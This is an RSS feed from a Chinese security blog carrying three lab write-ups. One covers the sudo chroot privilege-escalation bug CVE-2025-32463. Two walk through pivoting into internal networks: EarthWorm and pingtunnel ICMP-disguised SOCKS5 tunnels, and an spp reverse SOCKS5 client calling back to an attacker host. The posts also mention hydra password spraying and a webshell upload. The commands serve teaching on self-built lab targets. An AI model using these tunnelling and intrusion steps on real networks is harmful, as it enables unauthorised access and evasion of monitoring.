<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>内网攻防 on SlimerのBlog</title><link>http://localhost:1313/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/</link><description>Recent content in 内网攻防 on SlimerのBlog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Slimer</copyright><lastBuildDate>Fri, 10 Oct 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/index.xml" rel="self" type="application/rss+xml"/><item><title>【CVE-2025-32463】Linux sudo chroot 本地提权</title><link>http://localhost:1313/p/cve-2025-32463linux-sudo-chroot-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</link><pubDate>Fri, 10 Oct 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/cve-2025-32463linux-sudo-chroot-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</guid><description>&lt;img src="http://localhost:1313/images/91.webp" alt="Featured image of post 【CVE-2025-32463】Linux sudo chroot 本地提权" />&lt;h1 id="0x01-简介">0x01 简介&lt;/h1>
&lt;p>&lt;code>sudo chroot&lt;/code>是 Linux 系统中一个强大的命令组合，用于以超级用户权限切换到一个指定的目录，并将其作为新的根目录运行命令或启动会话。&lt;code>sudo&lt;/code>用于获取管理员权限，而 &lt;code>chroot&lt;/code>（change root）则会将指定目录设置为新的根目录，从而创建一个隔离的环境。这种组合常用于系统维护、软件测试和安全隔离等场景。例如，在修复系统问题时，可以通过 &lt;code>sudo chroot&lt;/code>进入一个隔离的环境，避免对主系统造成进一步影响；在软件测试中，可以限制测试环境的范围，防止潜在的系统级问题。通过这种方式，&lt;code>sudo chroot&lt;/code>提供了一种灵活且安全的方式来管理和操作 Linux 系统。&lt;/p>
&lt;h1 id="0x02-漏洞描述">0x02 漏洞描述&lt;/h1>
&lt;p>&lt;strong>漏洞编号：CVE-2025-32463&lt;/strong>&lt;br>
这是一个严重的本地提权漏洞，该漏洞 CVSS 评分为 7.8，属于高危漏洞。该漏洞允许本地低权限用户通过特制的恶意 &lt;code>chroot&lt;/code>环境触发动态库加载，从而以 root 权限执行任意代码。攻击者可以利用 &lt;code>sudo&lt;/code>的 &lt;code>-R&lt;/code>（即 &lt;code>--chroot&lt;/code>）选项，诱骗 &lt;code>sudo&lt;/code>使用用户指定的根目录加载恶意共享库。问题根源在于 &lt;code>sudo&lt;/code>在读取 &lt;code>sudoers&lt;/code>配置文件之前，就开始在用户控制的 &lt;code>chroot&lt;/code>环境中解析路径。&lt;/p>
&lt;h1 id="0x03-利用条件">0x03 利用条件&lt;/h1>
&lt;h2 id="1-影响版本">1) 影响版本&lt;/h2>
&lt;p>&lt;code>sudo --version&lt;/code>若输出的版本信息在 1.9.14 至 1.9.17 之间&lt;br>
1.9.14 &amp;lt;= sudo &amp;lt;= 1.9.17&lt;br>
1.8 系列及更早版本不受影响，因为它们不包含 chroot 功能。 在特定配置或发行版中，即使该版本早于官方公告，潜在的不安全行为仍可能被利用。&lt;/p>
&lt;h2 id="2-权限要求">2) 权限要求&lt;/h2>
&lt;p>普通用户&lt;/p>
&lt;h2 id="3-其他条件">3) 其他条件&lt;/h2>
&lt;p>&lt;code>sudo&lt;/code>版本要能使用 &lt;code>--chroot&lt;/code>功能&lt;/p>
&lt;h1 id="0x04-环境搭建">0x04 环境搭建&lt;/h1>
&lt;p>作者已尝试在 ubuntu-22.04.5-desktop-amd64 以及 ubuntu-18.04.6-desktop-amd64 复现过，均以失败告终，最后在 kali-linux-2024.1-amd64 上复现成功，后面又测试了几个系统，确认 &lt;strong>Fedora 41 Server&lt;/strong> 以及 &lt;strong>Ubuntu 24.04-1&lt;/strong> 也可被攻击。&lt;/p>
&lt;ul>
&lt;li>去官网下载 sudo 是漏洞版本内的 Linux ISO，这里以 2024 年第一版的 Kali 为例子。&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://old.kali.org/kali-images/kali-2024.1/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>然后就是在 VMware 上配置 Kali 虚拟机了，这一系列过程就不赘述了。&lt;/li>
&lt;/ul>
&lt;h1 id="0x05-漏洞复现">0x05 漏洞复现&lt;/h1>
&lt;p>POC：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">通过网盘分享的文件：CVE-2025-32463_chwoot-main.zip
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">链接: https://pan.baidu.com/s/1Qkb8ohhQPdwNope5RxZ11w 提取码: ynwk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--来自百度网盘超级会员v4的分享
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251010154955.png" alt="image.png">&lt;/p>
&lt;h1 id="0x06-修复建议">0x06 修复建议&lt;/h1>
&lt;ul>
&lt;li>安全更新&lt;/li>
&lt;li>目前官方已发布安全更新，建议用户尽快升级至最新版本：sudo &amp;gt;= 1.9.17p1&lt;/li>
&lt;li>官方补丁&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">- https://www.sudo.ws/security/advisories/host_any/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- https://www.sudo.ws/security/advisories/chroot_bug
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>临时处置&lt;/li>
&lt;li>在环境中搜索任何使用了 Host 或 Host_Alias 选项的内容。检查 &lt;code>/etc/sudoers&lt;/code>中定义的所有 Sudo 规则以及 &lt;code>/etc/sudoers.d&lt;/code>下的文件。如果 Sudo 规则存储在 LDAP 中，请使用 ldapsearch 等工具转储这些规则。&lt;/li>
&lt;/ul>
&lt;h1 id="参考链接">参考链接&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://ubuntu.com/security/CVE-2025-32463
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://nvd.nist.gov/vuln/detail/CVE-2025-32463
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【ICMP协议隧道代理】ew+pingtunnel组合建立scoks5隧道</title><link>http://localhost:1313/p/icmp%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86ew-pingtunnel%E7%BB%84%E5%90%88%E5%BB%BA%E7%AB%8Bscoks5%E9%9A%A7%E9%81%93/</link><pubDate>Fri, 12 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/icmp%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86ew-pingtunnel%E7%BB%84%E5%90%88%E5%BB%BA%E7%AB%8Bscoks5%E9%9A%A7%E9%81%93/</guid><description>&lt;img src="http://localhost:1313/images/62.webp" alt="Featured image of post 【ICMP协议隧道代理】ew+pingtunnel组合建立scoks5隧道" />&lt;h1 id="ewpingtunnel组合建立scoks5隧道">ew+pingtunnel组合建立scoks5隧道&lt;/h1>
&lt;h2 id="介绍">介绍&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Pingtunnel 是一种通过 ICMP 发送 TCP/UDP 流量的工具。其是最流行的一款ICMP代理工具，提供对tcp/udp/sock5流量伪装成icmp流量进行转发的功能。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">需要root或者administrator/system权限。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="环境">环境&lt;/h2>
&lt;p>A攻击机器：windows11（自己的电脑）（&lt;strong>10.10.10.131&lt;/strong>）&lt;br>
B代理机器（VPS，服务端）：kali（&lt;strong>10.10.10.133&lt;/strong>）&lt;br>
C跳板机器：windwos Server 2012（已攻入的服务器）（&lt;strong>20.20.20.134，10.10.10.135&lt;/strong>）&lt;br>
D目标机器：centos 7（&lt;strong>20.20.20.130&lt;/strong>）（搭建了一个小皮靶场）&lt;/p>
&lt;h2 id="实验效果">实验效果&lt;/h2>
&lt;p>在已经拿到公网win7服务器的前提下，通过ew与pingtunnel搭建能通往winserver2008的隧道，获取winserver2008的服务器权限。&lt;/p>
&lt;h2 id="实验准备">实验准备&lt;/h2>
&lt;p>工具：ew、pingtunnel、proxifer（代理工具）&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/idlefire/ew
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://github.com/esrrhs/pingtunnel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxifer官网自行下载
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="实验步骤">实验步骤&lt;/h2>
&lt;h3 id="b代理机器执行">B代理机器执行&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">./ew_for_linux64 -s rcsocks -l 10080 -e 8898
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>10080作为连接隧道的端口，8898作为隧道的通道，可以想象为，通向内网主机的路口为10080，走的这条路为8898。8898上所有的人（流量）都会通往10080这个路口。&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912132739.png" alt="image.png">&lt;/p>
&lt;h3 id="b代理机器执行-1">B代理机器执行&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">./pingtunnel -type server -noprint 1 -nolog 1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>意思是将ew启动的sock5协议转换为icmp协议来隐藏传输&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912132900.png" alt="image.png">&lt;/p>
&lt;h3 id="c跳板机器执行">C跳板机器执行&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">pingtunnel.exe -type client -l 127.0.0.1:9999 -s 10.10.10.133 -t 10.10.10.133:8898 -sock5 -1 -noprint 1 -nolog 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10.10.10.133：为VPS地址。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>意思是8898这条路上的sock5流量信息隐藏为icmp类型的数据在本C跳板机的9999端口进行转发。&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133238.png" alt="image.png">&lt;/p>
&lt;h3 id="c跳板机器执行-1">C跳板机器执行&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ew.exe -s rssocks -d 127.0.0.1 -e 9999
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>在本C跳板机9999端口开启转发流量&lt;/strong>&lt;br>
如果出现错误，请以&lt;strong>管理员身份&lt;/strong>运行即可。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133258.png" alt="image.png">&lt;/p>
&lt;h3 id="kali上出现ok字样时表示代理搭建完成">kali上出现OK字样时表示代理搭建完成&lt;/h3>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133354.png" alt="image.png">&lt;br>
使用A机器（自己的机器）win11，进行代理端口：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">10.10.10.133 10080
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133335.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133858.png" alt="image.png">&lt;br>
成功访问到D目标机器小皮面板。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912134124.png" alt="image.png">&lt;/p></description></item><item><title>【socks 5反向代理】spp内网穿透工具的使用</title><link>http://localhost:1313/p/socks-5%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86spp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Thu, 11 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/socks-5%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86spp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>&lt;img src="http://localhost:1313/images/60.webp" alt="Featured image of post 【socks 5反向代理】spp内网穿透工具的使用" />&lt;h1 id="拓扑图">拓扑图&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131018.png" alt="image.png">&lt;br>
目标机器搭建了一个BEES靶场。&lt;br>
&lt;strong>使用kali上传webshell上线BEES靶场。&lt;/strong>&lt;/p>
&lt;h1 id="靶机展示">靶机展示&lt;/h1>
&lt;p>&lt;strong>kali攻击机&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131112.png" alt="image.png">&lt;br>
&lt;strong>centos 7 跳板机&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131121.png" alt="image.png">&lt;br>
&lt;strong>windows server 2012 目标机器&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131131.png" alt="image.png">&lt;/p>
&lt;h1 id="使用场景">使用场景&lt;/h1>
&lt;p>当你拿到一台服务器（linux/windows）之后，发现目标机器有两个网卡，这时候可以直接在这台机器上上传一些信息收集工具，收集到另一个网段也有web服务。这时候就可以使用这种方式，使用socks5进行反向代理到内网，在攻击机器（kali）上直接可以访问目标网站，进行渗透测试。&lt;br>
使用简单方便，可以更快的对目标网站进行渗透测试。&lt;/p>
&lt;h1 id="攻击步骤">攻击步骤&lt;/h1>
&lt;p>1.kali对跳板机进行一次密码喷洒，获取跳板机的ssh登录密码，登录到跳板机后，对靶机进行一次信息收集。（发现靶机有两个网卡，并发现20段的主机20.20.20.129主机开启了80端口。）然后我们需要用kali，进攻20段主机，这时候是不通的，无法进攻。这时候我们就需要设置一个代理spp，监听8888端口。实现socks5代理。&lt;br>
2.上传spp到跳板机上，然后在kali上运行spp，让他作为服务端进行启动。监听8888端口，然后centos的spp反向连接kali的8888端口，然后kali服务端与centos进行协商通讯，1080端口作为socks5代理，在kali上监听，在kali上设置代理，就可以直接与20段进行通讯，对内部网络进行渗透。&lt;/p>
&lt;h1 id="步骤一">步骤一&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131228.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">使用hydra对跳板机进行密码喷洒，获取ssh密码，并登录到跳板机上。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">使用spp，以服务器的形式开启kali的8888端口进行监听。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131256.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131300.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">使用spp，以服务器的形式开启kali的8888端口进行监听。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./spp -type server -proto tcp -listen :8888 -proto ricmp -listen 0.0.0.0 -nolog 1 -noprint 1 &amp;amp;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">以服务器的形式运行，协议为tcp，监听8888端口，封装到ricmp协议，在本地进行监听 不保存日志，不在控制台打印日志，在后台运行。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">同时kali机器监听8888端口。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>如下图，spp已经成功监听8888端口。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131325.png" alt="image.png">&lt;/p>
&lt;h1 id="步骤二">步骤二&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131339.png" alt="image.png">&lt;br>
可以使kali通过socks5代理直接访问20段的web网站&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">使用scp命令，把spp上传到跳板机上的tmp目录下:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">scp spp root@10.10.10.128:/tmp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131356.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">到跳板机上查看tmp目录，发现已经成功上传
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131409.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">在跳板机上运行spp，开启socks5代理，连接spp服务器kali的spp服务器8888端口上，以1080端口进行通信
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./spp -name “16” -type reverse_socks5_client -server 10.10.10.129:8888 -fromaddr :1080 -proxyproto tcp -proto tcp -nolog 1 -noprint 1 &amp;amp;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131422.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">这时候kali上就会出现监听1080端口
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131432.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">设置socks 5代理
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vim /etc/proxychains4.conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131446.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">测试一下是否代理成功。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxychains rdesktop 20.20.20.129
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131458.png" alt="image.png">&lt;/p>
&lt;h1 id="步骤三">步骤三&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131507.png" alt="image.png">&lt;br>
在目标网站中进行渗透测试，上传webshell，拿下目标服务器。上线蚁剑&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">目标服务器有一个web靶场，这是我搭建的一个靶场，该靶场存在一个任意文件上传漏洞，可以通过改Content-Type:image/png，进行上传php文件。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">这里上传过程就不展示了，详细靶场情况可以参考，BEES靶场通过教程
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131524.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131528.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131532.png" alt="image.png">&lt;br>
获取到上传文件地址之后，就可以使用webshell连接工具直接连接了，这里有很多工具，就不说了，我这里使用的蚁剑进行连接，需要注意的是需要用蚁剑进行socks5代理进行连接上线&lt;br>
我这里用burp进行socks5代理了，就直接代理8080端口了。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">直接添加上传文件地址，输入密码，即可连接&lt;/span>
